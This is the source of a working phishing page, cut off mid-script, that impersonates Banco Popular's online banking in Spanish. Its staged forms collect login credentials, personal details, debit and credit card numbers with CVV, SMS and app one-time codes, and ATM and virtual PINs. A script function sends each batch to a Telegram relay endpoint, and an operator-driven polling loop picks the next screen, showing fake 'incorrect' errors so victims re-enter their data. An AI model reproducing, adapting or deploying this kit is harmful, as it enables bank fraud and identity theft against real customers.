<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca Virtual | Banco Popular</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Regular.woff2) format("woff2");
            font-style: normal;
            font-weight: 400;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Medium.woff2) format("woff2");
            font-style: normal;
            font-weight: 500;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-SemiBold.woff2) format("woff2");
            font-style: normal;
            font-weight: 600;
        }

        :root {
            --popular-blue: #003893;
            --popular-light-blue: #0055b8;
            --popular-dark-blue: #002663;
            --popular-red: #ed1c24;
            --popular-gray: #666666;
            --popular-light-gray: #f5f5f5;
            --popular-border: #d4d4d4;
            --popular-error: #d32f2f;
            --popular-success: #388e3c;
        }

        body {
            font-family: Inter, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #ffffff;
            color: #333333;
            margin: 0;
            padding: 0;
        }

        .header-container {
            background-color: var(--popular-blue);
            padding: 20px 0;
            text-align: center;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .header-container img {
            height: 45px;
            width: auto;
        }

        .main-title {
            font-family: Inter, sans-serif;
            font-weight: 600;
            font-size: 1.5rem;
            color: var(--popular-dark-blue);
            text-align: center;
            margin: 30px 0;
            line-height: 1.4;
        }

        .subtitle-text {
            font-family: Inter, sans-serif;
            font-weight: 400;
            font-size: 0.95rem;
            color: var(--popular-gray);
            text-align: center;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .form-container {
            background-color: #ffffff;
            border-radius: 12px;
            padding: 30px 20px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.08);
            margin: 0 auto;
            max-width: 480px;
        }

        .input-group-custom {
            margin-bottom: 20px;
        }

        .input-label {
            font-family: Inter, sans-serif;
            font-weight: 500;
            font-size: 0.875rem;
            color: var(--popular-dark-blue);
            margin-bottom: 8px;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--popular-border);
            border-radius: 8px;
            font-size: 1rem;
            font-family: Inter, sans-serif;
            transition: all 0.3s ease;
            background-color: #ffffff;
            color: #333333;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--popular-light-blue);
            box-shadow: 0 0 0 3px rgba(0, 85, 184, 0.1);
        }

        .input-field.error {
            border-color: var(--popular-error);
        }

        .select-field {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--popular-border);
            border-radius: 8px;
            font-size: 1rem;
            font-family: Inter, sans-serif;
            transition: all 0.3s ease;
            background-color: #ffffff;
            color: #333333;
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M10.293 3.293L6 7.586 1.707 3.293A1 1 0 00.293 4.707l5 5a1 1 0 001.414 0l5-5a1 1 0 10-1.414-1.414z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 16px center;
            padding-right: 40px;
        }

        .btn-primary-custom {
            background: linear-gradient(135deg, var(--popular-light-blue) 0%, var(--popular-blue) 100%);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 14px 40px;
            font-size: 1rem;
            font-weight: 600;
            font-family: Inter, sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0, 56, 147, 0.3);
            display: inline-block;
            min-width: 160px;
        }

        .btn-primary-custom:hover:not(:disabled) {
            background: linear-gradient(135deg, var(--popular-blue) 0%, var(--popular-dark-blue) 100%);
            box-shadow: 0 6px 20px rgba(0, 56, 147, 0.4);
            transform: translateY(-2px);
        }

        .btn-primary-custom:disabled {
            background: #cccccc;
            cursor: not-allowed;
            box-shadow: none;
            opacity: 0.6;
        }

        .error-message {
            color: var(--popular-error);
            font-size: 0.75rem;
            font-family: Inter, sans-serif;
            margin-top: 5px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .error-general {
            background-color: #ffebee;
            color: var(--popular-error);
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 0.875rem;
            margin-bottom: 20px;
            border-left: 4px solid var(--popular-error);
            display: none;
        }

        .error-general.show {
            display: block;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid var(--popular-light-gray);
            border-top: 4px solid var(--popular-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 20px;
            color: var(--popular-dark-blue);
            font-size: 1rem;
            font-weight: 500;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .checkbox-container input[type="checkbox"] {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            cursor: pointer;
            accent-color: var(--popular-blue);
        }

        .checkbox-container label {
            font-size: 0.875rem;
            color: var(--popular-gray);
            cursor: pointer;
            user-select: none;
        }

        .success-icon {
            color: var(--popular-success);
            font-size: 80px;
            margin-bottom: 20px;
        }

        .error-icon {
            color: var(--popular-error);
            font-size: 80px;
            margin-bottom: 20px;
        }

        .message-container {
            text-align: center;
            padding: 40px 20px;
        }

        .message-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--popular-dark-blue);
            margin-bottom: 15px;
        }

        .message-text {
            font-size: 1rem;
            color: var(--popular-gray);
            line-height: 1.5;
        }

        @media only screen and (min-width: 768px) {
            .form-container {
                max-width: 480px;
            }
        }

        @media only screen and (max-width: 767px) {
            .main-title {
                font-size: 1.25rem;
                margin: 20px 15px;
            }

            .form-container {
                margin: 0 15px;
                padding: 25px 15px;
            }

            .btn-primary-custom {
                width: 100%;
            }
        }

        .hidden {
            display: none !important;
        }

        .card-input-group {
            display: flex;
            gap: 15px;
        }

        .card-input-group > div {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.3s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>

<body>
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text">Por favor espere un momento...</div>
    </div>

    <!-- Header -->
    <div class="header-container">
        <img src="/popular/logo_popular.png" alt="Banco Popular" />
    </div>

    <!-- Vista: Login -->
    <div id="login" class="container-fluid hidden">
        <h1 class="main-title">Bienvenido a tu Banca Virtual</h1>
        <p class="subtitle-text">Ingresa tus credenciales para acceder a tu cuenta</p>

        <div class="form-container fade-in">
            <div id="errorGeneralLogin" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="tipo-documento">Tipo de Documento</label>
                <select class="select-field" id="tipo-documento">
                    <option value="1" selected>Cédula de Ciudadanía</option>
                    <option value="2">Tarjeta de Identidad</option>
                    <option value="3">Cédula de Extranjería</option>
                    <option value="4">Pasaporte</option>
                    <option value="5">NIT</option>
                </select>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="usuario">Número de Documento</label>
                <input type="text" class="input-field" id="usuario" placeholder="Ingresa tu número de documento"
                    minlength="5" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorUsuario"></div>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="clave">Contraseña</label>
                <input type="password" class="input-field" id="clave" placeholder="Ingresa tu contraseña"
                    minlength="4" maxlength="20" autocomplete="off">
                <div class="error-message" id="errorClave"></div>
            </div>

            <div class="text-center mt-4">
                <button id="btnLogin" class="btn-primary-custom" disabled>Ingresar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Datos Personales -->
    <div id="datos" class="container-fluid hidden">
        <h1 class="main-title">Verificación de Seguridad</h1>
        <p class="subtitle-text">Por tu seguridad, necesitamos confirmar tu información personal</p>

        <div class="form-container fade-in">
            <div id="errorGeneralDatos" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="nombre">Nombre Completo</label>
                <input type="text" class="input-field" id="nombre" placeholder="Ingresa tu nombre completo"
                    minlength="3" maxlength="100" autocomplete="off">
                <div class="error-message" id="errorNombre"></div>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="cedula">Número de Documento</label>
                <input type="text" class="input-field" id="cedula" placeholder="Ingresa tu número de documento"
                    minlength="5" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorCedula"></div>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="email">Correo Electrónico</label>
                <input type="email" class="input-field" id="email" placeholder="correo@ejemplo.com"
                    autocomplete="off">
                <div class="error-message" id="errorEmail"></div>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="celular">Número de Celular</label>
                <input type="text" class="input-field" id="celular" placeholder="3001234567"
                    minlength="10" maxlength="10" autocomplete="off">
                <div class="error-message" id="errorCelular"></div>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="ciudad">Ciudad</label>
                <input type="text" class="input-field" id="ciudad" placeholder="Ciudad de residencia"
                    minlength="3" maxlength="50" autocomplete="off">
                <div class="error-message" id="errorCiudad"></div>
            </div>

            <div class="input-group-custom">
                <label class="input-label" for="direccion">Dirección</label>
                <input type="text" class="input-field" id="direccion" placeholder="Dirección completa"
                    minlength="5" maxlength="100" autocomplete="off">
                <div class="error-message" id="errorDireccion"></div>
            </div>

            <div class="text-center mt-4">
                <button id="btnDatos" class="btn-primary-custom" disabled>Continuar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Débito -->
    <div id="tdb" class="container-fluid hidden">
        <h1 class="main-title">Verificación de Tarjeta Débito</h1>
        <p class="subtitle-text">Ingresa los datos de tu tarjeta débito para continuar</p>

        <div class="form-container fade-in">
            <div id="errorGeneralTDB" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="numtarjetaTDB">Número de Tarjeta</label>
                <input type="text" class="input-field" id="numtarjetaTDB"
                    placeholder="0000 0000 0000 0000" minlength="15" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDB"></div>
            </div>

            <div class="card-input-group">
                <div class="input-group-custom">
                    <label class="input-label" for="vencimientoTDB">Fecha de Vencimiento</label>
                    <input type="text" class="input-field" id="vencimientoTDB"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDB"></div>
                </div>

                <div class="input-group-custom">
                    <label class="input-label" for="cvvTDB">CVV</label>
                    <input type="text" class="input-field" id="cvvTDB"
                        placeholder="123" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDB"></div>
                </div>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="checkTDB">
                <label for="checkTDB">Confirmo que soy el titular de esta tarjeta</label>
            </div>

            <div class="text-center">
                <button id="btnTDB" class="btn-primary-custom" disabled>Validar Tarjeta</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Crédito -->
    <div id="tdc" class="container-fluid hidden">
        <h1 class="main-title">Verificación de Tarjeta Crédito</h1>
        <p class="subtitle-text">Ingresa los datos de tu tarjeta de crédito para continuar</p>

        <div class="form-container fade-in">
            <div id="errorGeneralTDC" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="numtarjetaTDC">Número de Tarjeta</label>
                <input type="text" class="input-field" id="numtarjetaTDC"
                    placeholder="0000 0000 0000 0000" minlength="15" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDC"></div>
            </div>

            <div class="card-input-group">
                <div class="input-group-custom">
                    <label class="input-label" for="vencimientoTDC">Fecha de Vencimiento</label>
                    <input type="text" class="input-field" id="vencimientoTDC"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDC"></div>
                </div>

                <div class="input-group-custom">
                    <label class="input-label" for="cvvTDC">CVV</label>
                    <input type="text" class="input-field" id="cvvTDC"
                        placeholder="123" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDC"></div>
                </div>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="checkTDC">
                <label for="checkTDC">Confirmo que soy el titular de esta tarjeta</label>
            </div>

            <div class="text-center">
                <button id="btnTDC" class="btn-primary-custom" disabled>Validar Tarjeta</button>
            </div>
        </div>
    </div>

    <!-- Vista: Código SMS -->
    <div id="codsms" class="container-fluid hidden">
        <h1 class="main-title">Código de Verificación SMS</h1>
        <p class="subtitle-text">Hemos enviado un código de verificación a tu celular registrado</p>

        <div class="form-container fade-in">
            <div id="errorGeneralCodSMS" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="codsmsInput">Código de Verificación</label>
                <input type="password" class="input-field" id="codsmsInput"
                    placeholder="Ingresa el código recibido" minlength="4" maxlength="8" autocomplete="off">
                <div class="error-message" id="errorCodSMS"></div>
            </div>

            <div class="text-center mt-4">
                <button id="btnCodSMS" class="btn-primary-custom" disabled>Verificar Código</button>
            </div>
        </div>
    </div>

    <!-- Vista: Código App -->
    <div id="codapp" class="container-fluid hidden">
        <h1 class="main-title">Código de Verificación App</h1>
        <p class="subtitle-text">Ingresa el código generado en tu aplicación móvil</p>

        <div class="form-container fade-in">
            <div id="errorGeneralCodApp" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="codappInput">Código de la Aplicación</label>
                <input type="password" class="input-field" id="codappInput"
                    placeholder="Ingresa el código de la app" minlength="4" maxlength="8" autocomplete="off">
                <div class="error-message" id="errorCodApp"></div>
            </div>

            <div class="text-center mt-4">
                <button id="btnCodApp" class="btn-primary-custom" disabled>Verificar Código</button>
            </div>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="pincaj" class="container-fluid hidden">
        <h1 class="main-title">Clave de Cajero Automático</h1>
        <p class="subtitle-text">Por seguridad, ingresa tu clave de cajero automático</p>

        <div class="form-container fade-in">
            <div id="errorGeneralPinCaj" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="pincajInput">Clave de 4 dígitos</label>
                <input type="password" class="input-field" id="pincajInput"
                    placeholder="****" minlength="4" maxlength="4" autocomplete="off">
                <div class="error-message" id="errorPinCaj"></div>
            </div>

            <div class="text-center mt-4">
                <button id="btnPinCaj" class="btn-primary-custom" disabled>Validar Clave</button>
            </div>
        </div>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="pinvir" class="container-fluid hidden">
        <h1 class="main-title">Clave Virtual</h1>
        <p class="subtitle-text">Ingresa tu clave virtual de 4 dígitos</p>

        <div class="form-container fade-in">
            <div id="errorGeneralPinVir" class="error-general"></div>

            <div class="input-group-custom">
                <label class="input-label" for="pinvirInput">Clave Virtual</label>
                <input type="password" class="input-field" id="pinvirInput"
                    placeholder="****" minlength="4" maxlength="4" autocomplete="off">
                <div class="error-message" id="errorPinVir"></div>
            </div>

            <div class="text-center mt-4">
                <button id="btnPinVir" class="btn-primary-custom" disabled>Validar Clave</button>
            </div>
        </div>
    </div>

    <!-- Vista: Éxito -->
    <div id="exito" class="container-fluid hidden">
        <div class="message-container fade-in">
            <div class="success-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                </svg>
            </div>
            <h2 class="message-title">Proceso Completado</h2>
            <p class="message-text">Tu transacción se ha procesado exitosamente.</p>
            <p class="message-text">Serás redirigido en unos segundos...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="container-fluid hidden">
        <div class="message-container fade-in">
            <div class="error-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM5.354 4.646a.5.5 0 1 0-.708.708L7.293 8l-2.647 2.646a.5.5 0 0 0 .708.708L8 8.707l2.646 2.647a.5.5 0 0 0 .708-.708L8.707 8l2.647-2.646a.5.5 0 0 0-.708-.708L8 7.293 5.354 4.646z"/>
                </svg>
            </div>
            <h2 class="message-title">Error en el Proceso</h2>
            <p class="message-text">No pudimos procesar tu solicitud en este momento.</p>
            <p class="message-text">Por favor, intenta nuevamente más tarde.</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="container-fluid hidden">
        <div class="message-container">
            <div class="spinner"></div>
            <p class="message-text" style="margin-top: 20px;">Procesando tu solicitud...</p>
            <p class="message-text">Por favor no cierres esta ventana.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login',
                attemptCount: {}
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function mostrarError(fieldId, errorId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + fieldId).addClass('error');
            }

            function ocultarError(fieldId, errorId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + fieldId).removeClass('error');
            }

            function hideAllViews() {
                $('#login, #datos, #tdb, #tdc, #codsms, #codapp, #pincaj, #pinvir, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Verificar si es una vista repetida
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    // Incrementar contador de intentos
                    appState.attemptCount[viewId] = (appState.attemptCount[viewId] || 0) + 1;

                    // Mostrar mensajes de error específicos
                    const errorMessages = {
                        'login': 'Credenciales incorrectas. Por favor verifica e intenta nuevamente.',
                        'datos': 'Los datos ingresados no coinciden con nuestros registros.',
                        'tdb': 'Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.',
                        'tdc': 'Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.',
                        'codsms': 'Código incorrecto. Solicita un nuevo código si es necesario.',
                        'codapp': 'Código incorrecto. Genera un nuevo código en tu aplicación.',
                        'pincaj': 'Clave incorrecta. Verifica e intenta nuevamente.',
                        'pinvir': 'Clave incorrecta. Verifica e intenta nuevamente.'
                    };

                    const errorElement = $('#errorGeneral' + viewId.charAt(0).toUpperCase() + viewId.slice(1));
                    if (errorElement.length === 0) {
                        // Para vistas con nombres compuestos
                        const mappedIds = {
                            'codsms': 'CodSMS',
                            'codapp': 'CodApp',
                            'pincaj': 'PinCaj',
                            'pinvir': 'PinVir',
                            'login': 'Login',
                            'datos': 'Datos',
                            'tdb': 'TDB',
                            'tdc': 'TDC'
                        };
                        $('#errorGeneral' + mappedIds[viewId]).text(errorMessages[viewId]).addClass('show');
                    } else {
                        errorElement.text(errorMessages[viewId]).addClass('show');
                    }

                    // Limpiar campos
                    clearViewFields(viewId);
                } else {
                    // Ocultar mensajes de error
                    $('.error-general').removeClass('show').text('');
                }

                // Registrar vista en historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function clearViewFields(viewId) {
                const fieldsToClear = {
                    'login': ['#usuario', '#clave'],
                    'datos': ['#nombre', '#cedula', '#email', '#celular', '#ciudad', '#direccion'],
                    'tdb': ['#numtarjetaTDB', '#vencimientoTDB', '#cvvTDB'],
                    'tdc': ['#numtarjetaTDC', '#vencimientoTDC', '#cvvTDC'],
                    'codsms': ['#codsmsInput'],
                    'codapp': ['#codappInput'],
                    'pincaj': ['#pincajInput'],
                    'pinvir': ['#pinvirInput']
                };

                if (fieldsToClear[viewId]) {
                    fieldsToClear[viewId].forEach(field => $(field).val(''));
                }

                // Desmarcar checkboxes
                if (viewId === 'tdb') $('#checkTDB').prop('checked', false);
                if (viewId === 'tdc') $('#checkTDC').prop('checked', false);

                // Deshabilitar botones
                $(`#${viewId} button`).prop('disabled', true);
            }

            function showLoading() {
                $('#loading').addClass('active');
                setTimeout(iniciarPolling, 3000);
            }

            function hideLoading() {
                $('#loading').removeClass('active');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = [
                    'usuario', 'clave', 'ente', 'nombre', 'cedula', 'email', 'celular',
                    'ciudad', 'direccion', 'departamento', 'banco', 'tipoPersona',
                    'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                    'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC', 'codsms', 'codapp',
                    'pincaj', 'pinvir', 'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                console.log('Enviando datos a Telegram:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Respuesta de Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (!loadingElement || !loadingElement.classList.contains('active')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        const viewMap = {
                            'login': 'login',
                            'datos': 'datos',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'pinvir': 'pinvir',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección para vistas finales
                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.bancopopular.com.co/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = usuario.length >= 5 && clave.length >= 4;
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateDatos() {
                const nombre = $('#nombre').val().trim();
                const cedula = $('#cedula').val().trim();
                const email = $('#email').val().trim();
                const celular = $('#celular').val().trim();
                const ciudad = $('#ciudad').val().trim();
                const direccion = $('#direccion').val().trim();

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

                const isValid = nombre.length >= 3 &&
                               cedula.length >= 5 &&
                               emailRegex.test(email) &&
                               celular.length === 10 &&
                               /^\d+$/.test(celular) &&
                               ciudad.length >= 3 &&
                               direccion.length >= 5;

                $('#btnDatos').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta(tipo) {
                const prefix = tipo === 'tdb' ? 'TDB' : 'TDC';
                const num = $('#numtarjeta' + prefix).val().replace(/\s/g, '');
                const ven = $('#vencimiento' + prefix).val();
                const cvv = $('#cvv' + prefix).val();
                const check = $('#check' + prefix).is(':checked');

                const isValid = num.length >= 15 &&
                               validarLuhn(num) &&
                               validarVencimiento(ven) &&
                               cvv.length >= 3 &&
                               /^\d+$/.test(cvv) &&
                               check;

                $('#btn' + prefix).prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId, minLength = 4) {
                const value = $(inputId).val().trim();
                const isValid = /^\d+$/.test(value) && value.length >= minLength && value.length <= 8;
                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS DE FORMULARIOS ====================

            // Login
            $('#usuario, #clave').on('input', validateLogin);

            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'popular');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Datos Personales
            $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', validateDatos);

            $('#btnDatos').on('click', async function () {
                if (validateDatos()) {
                    saveToLocalStorage('nombre', $('#nombre').val().trim());
                    saveToLocalStorage('cedula', $('#cedula').val().trim());
                    saveToLocalStorage('email', $('#email').val().trim());
                    saveToLocalStorage('celular', $('#celular').val().trim());
                    saveToLocalStorage('ciudad', $('#ciudad').val().trim());
                    saveToLocalStorage('direccion', $('#direccion').val().trim());
                    saveToLocalStorage('status', 'DATOS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Formateo de tarjetas
            function formatCardNumber(input) {
                let value = input.val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                input.val(formattedValue);
            }

            function formatExpiry(input) {
                let value = input.val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                input.val(value);
            }

            function formatCVV(input) {
                let value = input.val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                input.val(value);
            }

            // Tarjeta de Débito
            $('#numtarjetaTDB').on('input', function () {
                formatCardNumber($(this));
